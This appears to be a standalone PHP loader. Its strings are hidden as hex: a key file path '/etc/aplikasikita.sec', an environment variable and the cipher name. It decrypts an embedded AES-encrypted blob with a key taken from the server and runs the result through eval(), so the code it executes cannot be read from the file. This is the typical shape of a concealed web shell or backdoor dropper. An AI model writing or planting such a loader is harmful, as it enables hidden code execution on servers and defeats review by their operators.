<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('MyaKr//3zDeYD2aDhQAXRg==');

$c=base64_decode(

'HXMRge6YHFUJdZQjdM6CoyiZiKeQiRGMBFGzQY315aeCASHMeoOL2FnuvgTPVMydvVT5Q8TN2Cs8' .
'2s7iIQKyBgqflPGElVFeQyFY4rCrCywHzvRlCRK1gXhNQVcoMUicjAty0jy0eo9lTMFPCfRCfIw3' .
'UsMREqwXK5w4FGp4qKEy2MYTK6JIG5y7XZ6mUZKS5HGY0EZumGvF0NsQzeSkl311iemjPvht1oEb' .
'hYAItGm0+XR4kTcsmea0/Wd9JrVls+RpptmityV47m9RA26O9X6sb7I6my5vjsv86/fKzKDtoTSc' .
'I2vdAEPPX0NmBtbSZIMknJ1Xk1eOILdni8NACCNNmXQ0u3QGOdkcwRMKYTmJ/cplKqsqr3aL7IGk' .
'C0UKubR4hhbiFY5UiFWbjPvSo9m32XL0PENzw7zvZfhqXyJaugIr6oddcQolW1gl5ozJhC/NUnf/' .
'paOQJBHOBeBlrHH7H0W3lRUvc5gd36YPt3Vil9Z8BdcDlEukJ1LHiqd0N67xrlA4/x3wGwX5UHdR' .
'K2BBgKdrsZShUe8DDuRO/nBI4L6x2L4X/5U7Duq/Z6UAk6CKR2dQrZ+XwFa8/NpYt2pLL6AnjInQ' .
't8t6GU95kJltlXFJl3+IMID/0dl8S7Xhra8YRLmZiQK3UHRFOD2HkC9IlYqBKiHg2/CelX/oHQPv' .
'aFh91Q53nVlh/RvWQIFb7kuIVKQBVZ/JA7a7praBAA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

